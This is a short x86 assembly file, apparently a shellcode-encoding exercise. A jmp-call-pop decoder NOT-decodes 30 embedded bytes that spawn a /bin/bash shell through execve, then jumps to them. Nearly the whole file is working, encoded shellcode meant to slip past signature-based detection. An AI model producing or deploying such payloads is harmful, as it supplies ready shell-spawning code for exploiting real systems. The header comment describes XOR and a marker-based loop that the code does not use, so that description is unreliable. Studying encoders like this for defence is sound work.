;Author: Eduardo
;Filename: xor_not_decoder.asm
;A NOT encoded program which shellcode is decode in memory by using two's complement  the xor operation instead of using the length of the shellcode to be decoded.
;Generally the marker is the xor key
;

global _start

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi
	xor ecx, ecx
	mov cl, 30


decode:
	not byte [esi]
	inc esi
	loop decode

	jmp short Shellcode


call_decoder:

	call decoder
	Shellcode: db 0xce,0x3f,0xaf,0x97,0x9d,0x9e,0x8c,0x97,0x97,0xd0,0xd0,0xd0,0xd0,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f

